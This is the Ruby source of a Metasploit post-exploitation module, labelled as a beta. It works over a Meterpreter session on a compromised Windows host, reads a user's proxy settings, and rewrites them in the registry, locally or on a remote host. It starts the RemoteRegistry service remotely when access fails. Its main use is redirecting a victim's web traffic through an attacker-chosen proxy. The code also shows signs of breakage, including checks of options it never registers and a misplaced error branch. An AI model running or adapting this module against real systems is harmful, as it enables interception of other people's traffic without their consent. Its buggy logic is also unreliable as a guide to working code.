#
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/windows/services'

class Metasploit3 < Msf::Post

	DEBUG = false

        include Post::Windows::Services

        def initialize
                super(
                        'Name'        => 'Windows Gather Proxy Setting (BETA)',
                        'Description'    => %q{
                                This module pulls a user's proxy settings. If neither RHOST or SID
                                are set it pulls the current user, else it will pull the user's settings
                                specified SID and target host.
                        },
                        'Author'      => [
						'mubix',	# enum_proxy.rb
						'surefire'	# Added ability to configure proxy
						],
                        'License'     => MSF_LICENSE,
                        'Platform'      => [ 'win' ],
                        'SessionTypes'  => [ 'meterpreter' ]
                )

                register_options(
                        [
                                OptAddress.new('RHOST',        [ false, 'Remote host to clone settings to, defaults to local' ]),
                                OptString.new('SID',           [ false, 'SID of user to clone settings to (SYSTEM is S-1-5-18)' ]),
                                OptString.new('SINGLEPROXY',   [ false, 'Provide HOST:PORT setting of proxy server for all protocols']),
                                OptString.new('HTTPPROXY',     [ false, 'Provide HOST:PORT setting of proxy server for HTTP protocols']),
                                OptString.new('HTTPSPROXY',    [ false, 'Provide HOST:PORT setting of proxy server for HTTPS protocols']),
                                OptString.new('FTPPROXY',      [ false, 'Provide HOST:PORT setting of proxy server for FTP protocols']),
                                OptString.new('SOCKSPROXY',    [ false, 'Provide HOST:PORT setting of proxy server for SOCKS protocols']),
                                OptString.new('AUTOCONFIGURL', [ false, 'Provide URL to configuration file for AutoConfig functionality']),
                                OptString.new('EXCEPTIONS',    [ false, 'Exclude proxying for hosts beginning with (semicolon-delimited)']),
                                OptBool.new('WPAD',            [ true, 'Enable/disable WPAD.  ("Automatically detect settings")']),
                                OptBool.new('AUTOCONFIG',      [ true, 'Enable/disable AutoConfig. ("Use automatic configuration script")']),
                                OptBool.new('ENABLE',          [ true, 'Enable/disable proxy server. ("Use a proxy server for your LAN")'])
                        ], self.class)
        end

        def run
		# Check if ENABLE is TRUE, but all strings are blank.  Error out.
		# Check if SINGLEPROXY is set, as well as any other PROXY string.  If so, error out.

                if datastore['SID']
                        root_key, base_key = session.sys.registry.splitkey("HKU\\#{datastore['SID']}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections")
                else
                        root_key, base_key = session.sys.registry.splitkey("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections")
                end

                if datastore['RHOST']
                        begin
                                key = session.sys.registry.open_remote_key(datastore['RHOST'], root_key)
                        rescue ::Rex::Post::Meterpreter::RequestError
                                print_error("Unable to contact remote registry service on #{datastore['RHOST']}")
                                print_status("Attempting to start service remotely...")
                                begin
                                        service_start('RemoteRegistry',datastore['RHOST'])
                                rescue
                                        print_error('Unable to read registry or start the service, exiting...')
                                        return
                                end
			if (datastore['HTTPPROXY'] or datastore['HTTPSPROXY'] or datastore['FTPPROXY'] or datastore['GOPHERPROXY'] or datastore['SOCKSPROXY'])
				print_error "FATAL ERROR: SINGLEPROXY cannot be defined with other proxies.  Aborting."
				return false
			end
                                startedreg = true
                                key = session.sys.registry.open_remote_key(datastore['RHOST'], root_key)
                        end
                        open_key = key.create_key(base_key, KEY_WRITE + KEY_READ + 0x0000)
                else
                        open_key = session.sys.registry.create_key(root_key, base_key, KEY_WRITE + KEY_READ + 0x0000)
                end

                values = open_key.query_value('DefaultConnectionSettings')		# ERROR CHECKING TO MAKE SURE THE KEY EXISTS
		print_status "----- PREVIOUS SETTINGS -----"
		retVal = queryProxy(values.data)
		if not retVal
			print_error "FATAL ERROR: Unrecognized proxy configuration.  Aborting."
	                service_stop('RemoteRegistry',datastore['RHOST']) if startedreg
			return -1
		end

                newSettings = configureProxy(values.data) if not datastore['READONLY']
		print_status "-----   NEW SETTINGS   -----"
		queryProxy(newSettings) if newSettings

                #If we started the service we need to stop it.
                service_stop('RemoteRegistry',datastore['RHOST']) if startedreg

		print "\n"
        end

        def configureProxy(current)
                internetSettings_key = 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections'

		new = current

		new = configureProxySetting(new)
		new = configureProxyIPs(new)

		if new
	        	retVal = registry_setvaldata(internetSettings_key,'DefaultConnectionSettings',new.to_s(),"REG_BINARY")
			if not retVal
        		        print_error "ERROR: Unable to modify ProxyEnable setting. (Returned error code: #{retVal.to_i()})"
				return false
	        	end
		else
			print_error "FATAL ERROR: Invalid confiugration data.  Not modifying the target's configuration."
		end

		return new
        end

	def queryProxy(data)
		i = 0
		proxyServerEnd = 999			# I have to have this here for scoping reasons.  (grumble)

		if DEBUG ### PRINT EACH BYTE, CHARACTER AND REPRESENTATION ###
			data.each_byte do |stringChar|	# FOR DEBUGGING PURPOSES ONLY
				case (i)
					when 8
						proxySetting = queryProxySetting(stringChar)
						cursor = "PROXY SETTING (#{proxySetting})"
					when 12
						proxyServerLength = stringChar.to_i
						proxyServerEnd = 16 + proxyServerLength
						cursor = "PROXY SERVER LENGTH (#{proxyServerLength}) = OFFSETS 16 - #{proxyServerEnd}"
					when 16
						cursor = "PROXY SERVER"
					when proxyServerEnd
						cursor = "END PROXY SERVER"
					else
						cursor = ""
				end

				print_status "#{"%3d" % i}: " + "#{"%5s" % stringChar.chr}" + " (#{"%02x" % stringChar})   " + cursor
				i = i + 1
			end
		end
		################################################################

		proxySetting = queryProxySetting((data[8,1].unpack('C*'))[0])
		return false if not proxySetting

                print_status "Proxy Counter: #{(data[4,1].unpack('C*'))[0]}"
		print_status "Proxy Setting: #{proxySetting}"

                cursor = 12
                proxyserver = data[cursor+4, (data[cursor,1].unpack('C*'))[0]]
                print_status "Proxy Server:  #{proxyserver}" if proxyserver != ""

                cursor = cursor + 4 + (data[cursor].unpack('C*'))[0]
                additionalinfo = data[cursor+4, (data[cursor,1].unpack('C*'))[0]]
                print_status "Additional Info: #{additionalinfo}" if additionalinfo != ""

                cursor = cursor + 4 + (data[cursor].unpack('C*'))[0]				
                autoconfigurl = data[cursor+4, (data[cursor,1].unpack('C*'))[0]]
       	        print_status "AutoConfigURL: #{autoconfigurl}" if autoconfigurl != ""

		return true
	end

	def queryProxySetting(byte)
                case (byte)
                        when 1
                                return "No proxy settings (#{byte})"
                        when 3
                                return "Proxy server (#{byte})"
                        when 5
                                return "Set proxy via AutoConfigure script (#{byte})"
                        when 7
                                return "Proxy server and AutoConfigure script (#{byte})"
                        when 9
                                return "WPAD (#{byte})"
                        when 11
                                return "WPAD and Proxy server (#{byte})"
                        when 13
                                return "WPAD and AutoConfigure script (#{byte})"
                        when 15
                                return "WPAD, Proxy server and AutoConfigure script (#{byte})"
                        else
                                return "Unknown proxy setting found (#{byte})"
                end
	end

	def clearProxyIPs(new)
		# Calculate lengths to be used in adjusting the proxy server string
		currentServerLength = new[12].ord
		print_error "Current Server Length = #{currentServerLength}" if DEBUG

		# Trim out the old proxy server (if any)
		print_error "Before length = " + new.length.to_s if DEBUG
		startTrim = currentServerLength + 16
		print_error "Trimming from 15 to " + startTrim.to_s if DEBUG
		new = new[0..15] + new[startTrim,9999]
		print_error "After length = " + new.length.to_s if DEBUG

		new[12] = 0.chr
		return new
	end

	def configureProxyIPs(new)
		if not (datastore['SINGLEPROXY'] or datastore['HTTPPROXY'] or datastore['HTTPSPROXY'] or datastore['FTPPROXY'] or datastore['GOPHERPROXY'] or datastore['SOCKSPROXY'])
			# Check to see if *any* proxy servers were defined.  It's probably okay, though.
			print_error "WARNING: No proxy servers defined.  Clearing all proxy server IPs."
			new = clearProxyIPs(new)

			if ((not datastore['SINGLEPROXY']) and (not datastore['SOCKSPROXY']))
				print_error "WARNING: Enabling proxy functionality without specifying SINGLEPROXY or SOCKSPROXY may lead to network issues."
			end

		elsif (datastore['SINGLEPROXY']) and (datastore['HTTPPROXY'] or datastore['HTTPSPROXY'] or datastore['FTPPROXY'] or datastore['GOPHERPROXY'] or datastore['SOCKSPROXY'])
			# Check to make sure other proxies weren't defined.  That would be a conflict.
			print_error "FATAL ERROR: SINGLEPROXY cannot be defined with other proxies.  Aborting."
			return false
		elsif datastore['SINGLEPROXY']

			new = clearProxyIPs(new)

			# Insert the string containing the new proxy server
			new.insert(16, datastore['SINGLEPROXY'])

			# Set proxy length value to match length of user-supplied value
			new[12] = datastore['SINGLEPROXY'].length.to_i.chr
		else
			proxyServers = ""
			if datastore['HTTPPROXY']
				proxyServers += "http=#{datastore['HTTPPROXY']};"
			end
			if datastore['HTTPSPROXY']
				proxyServers += "https=#{datastore['HTTPSPROXY']};"
			end
			if datastore['FTPPROXY']
				proxyServers += "ftp=#{datastore['FTPPROXY']};"
			end
			if datastore['GOPHERPROXY']
				proxyServers += "gopher=#{datastore['GOPHERPROXY']};"
			end
			if datastore['SOCKSPROXY']
				proxyServers += "socks=#{datastore['SOCKSPROXY']};"
			end
			new = clearProxyIPs(new)

			# Insert the string containing the new proxy server
			new.insert(16, proxyServers)

			# Set proxy length value to match length of user-supplied value
			new[12] = proxyServers.length.to_i.chr
		end
		return new
	end

	def configureProxySetting(new)
		
		byte = 1

		if datastore['ENABLE']
			print_status "Enabling proxy server..." if DEBUG
			byte += 2
		elsif not datastore['ENABLE']
			print_status "Disabling proxy server..." if DEBUG
		end

		if datastore['AUTOCONFIG']
			print_status "Enabling autoconfig..." if DEBUG
			byte += 4
		elsif not datastore['AUTOCONFIG']
			print_status "Disabling autoconfig..." if DEBUG
		end

		if datastore['WPAD']
			print_status "Enabling WPAD..." if DEBUG
			byte += 8
		elsif not datastore['WPAD']
			print_status "Disabling WPAD..." if DEBUG
		end

		new[8] = byte.chr
		return new
	end
end
